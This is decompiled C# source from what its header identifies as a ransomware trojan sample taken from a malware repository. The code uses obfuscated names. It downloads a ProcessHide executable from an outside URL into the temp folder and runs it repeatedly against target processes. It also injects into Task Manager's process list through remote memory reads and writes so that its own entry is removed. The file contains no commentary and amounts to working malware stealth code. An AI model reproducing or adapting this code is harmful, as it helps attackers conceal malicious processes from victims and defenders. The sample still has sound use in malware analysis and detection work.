// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.FAripJTXHNalmT
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace MufMaOSvGyvz
{
  internal class FAripJTXHNalmT
  {
    private static volatile bool wyfMfGMephQYv = false;
    public static volatile bool MBcnWmpVGoY = true;

    public static string HVdDOGYwRUMbY()
    {
      IyUWqQZlcOSTLhq.idAGkbKivQU = IntPtr.Size != 8 ? FAripJTXHNalmT.aCnqtSuKCmAZoP(new Uri("https://raw.githubusercontent.com/d35ha/ProcessHide/master/bins/ProcessHide32.exe")) : FAripJTXHNalmT.aCnqtSuKCmAZoP(new Uri("https://raw.githubusercontent.com/d35ha/ProcessHide/master/bins/ProcessHide64.exe"));
      return IyUWqQZlcOSTLhq.idAGkbKivQU;
    }

    public static string aCnqtSuKCmAZoP(Uri uri_0)
    {
      string str;
      try
      {
        string path2 = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
        new WebClient().DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path2));
        str = Path.Combine(Path.GetTempPath(), path2);
        goto label_4;
      }
      catch
      {
      }
      str = string.Empty;
label_4:
      return str;
    }

    public static Process QmucamfUxZMxrb(string string_0)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains(string_0))
          return process;
      }
      return (Process) null;
    }

    public static void bTnVewWeool(string[] string_0)
    {
      string BevAcsDSfs = FAripJTXHNalmT.HVdDOGYwRUMbY();
      if (string.IsNullOrEmpty(BevAcsDSfs))
        return;
      while (true)
      {
        foreach (string string_0_1 in string_0)
        {
          Process process = FAripJTXHNalmT.QmucamfUxZMxrb(string_0_1);
          if (process != null)
          {
            string str = process.Id.ToString();
            IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(BevAcsDSfs, str + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName));
            IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(BevAcsDSfs, str + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + " *32");
          }
        }
        Thread.Sleep(200);
      }
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(
      IntPtr intptr_0,
      IntPtr intptr_1,
      uint uint_0,
      int int_0,
      int int_1);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualFreeEx(
      IntPtr intptr_0,
      IntPtr intptr_1,
      uint uint_0,
      int int_0);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hpVveBdaWnIOYwwXL);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
      IntPtr lwnhiHQymS,
      IntPtr MVXdKsATqXjz,
      byte[] bkwmIIPdfbtubjzt,
      uint vfujrsmJYTYOJ,
      out UIntPtr VPgzioQLDTipZa);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(
      IntPtr cnKjHptFUVK,
      IntPtr mVxmaCVnaXkzH,
      [Out] byte[] kIhITkZndbo,
      int DBnBUzxFnURa,
      out UIntPtr LukJReEMLTi);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint GetWindowThreadProcessId(
      IntPtr uAVwxRJcBfGrC,
      out uint DcJpBfTnaufiPjJ);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr SendMessage(
      IntPtr intptr_0,
      uint uint_0,
      IntPtr intptr_1,
      IntPtr intptr_2);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(string string_0, string string_1);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindowEx(
      IntPtr intptr_0,
      IntPtr intptr_1,
      string string_0,
      string string_1);

    private static byte[] xlkMLKlWGZWwZ(object object_0)
    {
      int length = Marshal.SizeOf(object_0);
      byte[] destination = new byte[length];
      IntPtr num = Marshal.AllocHGlobal(length);
      Marshal.StructureToPtr(object_0, num, true);
      Marshal.Copy(num, destination, 0, length);
      Marshal.FreeHGlobal(num);
      return destination;
    }

    private static IntPtr hudlnRxOPs(uint uint_0) => FAripJTXHNalmT.OpenProcess(56, false, uint_0);

    private static void wAMYYYwXmK(IntPtr intptr_0) => FAripJTXHNalmT.CloseHandle(intptr_0);

    private static IntPtr FsCAEUIVSVWd(uint uint_0, IntPtr intptr_0) => FAripJTXHNalmT.VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);

    private static void tKMDpFSpGuZN(IntPtr intptr_0, IntPtr intptr_1, uint uint_0) => FAripJTXHNalmT.VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);

    private static IntPtr NtLonxvoOxB()
    {
      IntPtr window = FAripJTXHNalmT.FindWindow("TaskManagerWindow", "Administrador de tareas");
      return !(window == IntPtr.Zero) ? FAripJTXHNalmT.FindWindowEx(FAripJTXHNalmT.FindWindowEx(window, IntPtr.Zero, "#32770", (string) null), IntPtr.Zero, "SysListView32", "Procesos") : FAripJTXHNalmT.FindWindowEx(FAripJTXHNalmT.FindWindowEx(FAripJTXHNalmT.FindWindow("#32770", "Task Manager"), IntPtr.Zero, "#32770", (string) null), IntPtr.Zero, "SysListView32", "Processes");
    }

    private static IntPtr fIkVfvUgSjPG(IntPtr intptr_0) => FAripJTXHNalmT.SendMessage(intptr_0, 4100U, IntPtr.Zero, IntPtr.Zero);

    private static void wgrXTwnNAaf(IntPtr intptr_0, IntPtr intptr_1) => FAripJTXHNalmT.SendMessage(intptr_0, 4104U, intptr_1, IntPtr.Zero);

    private static void OuHgjAYREBr(IntPtr intptr_0) => FAripJTXHNalmT.SendMessage(intptr_0, 4124U, IntPtr.Zero, IntPtr.Zero);

    private static string tUqinHynNcPVsx(IntPtr intptr_0, IntPtr intptr_1)
    {
      byte[] numArray = new byte[50];
      FAripJTXHNalmT.dKbHtpDNcyBx dKbHtpDncyBx = new FAripJTXHNalmT.dKbHtpDNcyBx();
      uint DcJpBfTnaufiPjJ;
      int windowThreadProcessId = (int) FAripJTXHNalmT.GetWindowThreadProcessId(intptr_0, out DcJpBfTnaufiPjJ);
      IntPtr num1 = FAripJTXHNalmT.hudlnRxOPs(DcJpBfTnaufiPjJ);
      IntPtr num2 = FAripJTXHNalmT.FsCAEUIVSVWd((uint) Marshal.SizeOf<FAripJTXHNalmT.dKbHtpDNcyBx>(dKbHtpDncyBx), num1);
      IntPtr num3 = FAripJTXHNalmT.FsCAEUIVSVWd(50U, num1);
      dKbHtpDncyBx.TJgUaBOUBT = intptr_1;
      dKbHtpDncyBx.VSUSauiToCtS = (IntPtr) 0;
      dKbHtpDncyBx.SHlkcsOkGpZs = 50U;
      dKbHtpDncyBx.wXxIWQZbNvLd = num3;
      UIntPtr num4;
      FAripJTXHNalmT.WriteProcessMemory(num1, num2, FAripJTXHNalmT.xlkMLKlWGZWwZ((object) dKbHtpDncyBx), (uint) Marshal.SizeOf<FAripJTXHNalmT.dKbHtpDNcyBx>(dKbHtpDncyBx), out num4);
      FAripJTXHNalmT.SendMessage(intptr_0, 4141U, intptr_1, num2);
      FAripJTXHNalmT.ReadProcessMemory(num1, num3, numArray, 50, out num4);
      FAripJTXHNalmT.tKMDpFSpGuZN(num1, num2, (uint) Marshal.SizeOf<FAripJTXHNalmT.dKbHtpDNcyBx>(dKbHtpDncyBx));
      FAripJTXHNalmT.tKMDpFSpGuZN(num1, num3, 50U);
      FAripJTXHNalmT.wAMYYYwXmK(num1);
      return Encoding.ASCII.GetString(numArray);
    }

    private static void KCoFoxHfCdddyk(string string_0)
    {
      IntPtr intptr_0 = FAripJTXHNalmT.NtLonxvoOxB();
      if (!(intptr_0 != IntPtr.Zero))
        return;
      int num = (int) FAripJTXHNalmT.fIkVfvUgSjPG(intptr_0);
      for (int intptr_1 = 0; intptr_1 < num; ++intptr_1)
      {
        if (FAripJTXHNalmT.tUqinHynNcPVsx(intptr_0, (IntPtr) intptr_1).Contains(string_0))
          FAripJTXHNalmT.wgrXTwnNAaf(intptr_0, (IntPtr) intptr_1);
      }
    }

    private static void DovaYSxHzOl()
    {
      IntPtr intptr_0 = FAripJTXHNalmT.NtLonxvoOxB();
      if (!(intptr_0 != IntPtr.Zero))
        return;
      FAripJTXHNalmT.OuHgjAYREBr(intptr_0);
      FAripJTXHNalmT.OuHgjAYREBr(intptr_0);
      FAripJTXHNalmT.OuHgjAYREBr(intptr_0);
      FAripJTXHNalmT.OuHgjAYREBr(intptr_0);
      FAripJTXHNalmT.OuHgjAYREBr(intptr_0);
    }

    public static void QvJxjZHBdlZUQ() => new Thread(new ThreadStart(FAripJTXHNalmT.jihBulueichnMdbb)).Start();

    private static void jihBulueichnMdbb()
    {
      while (!FAripJTXHNalmT.wyfMfGMephQYv)
      {
        if (FAripJTXHNalmT.MBcnWmpVGoY)
        {
          FAripJTXHNalmT.KCoFoxHfCdddyk(Process.GetCurrentProcess().ProcessName + ".exe");
          Thread.Sleep(525);
        }
        else
        {
          FAripJTXHNalmT.DovaYSxHzOl();
          Thread.Sleep(1000);
        }
      }
      FAripJTXHNalmT.wyfMfGMephQYv = false;
    }

    private struct dKbHtpDNcyBx
    {
      public uint laPFOpqrWXuj;
      public IntPtr TJgUaBOUBT;
      public IntPtr VSUSauiToCtS;
      public uint ZgoSmFztkCuP;
      public uint HOTinmJKMbJDIGg;
      public IntPtr wXxIWQZbNvLd;
      public uint SHlkcsOkGpZs;
      public int JLQNzdehnuTU;
      public IntPtr rruYURRPeG;
    }
  }
}
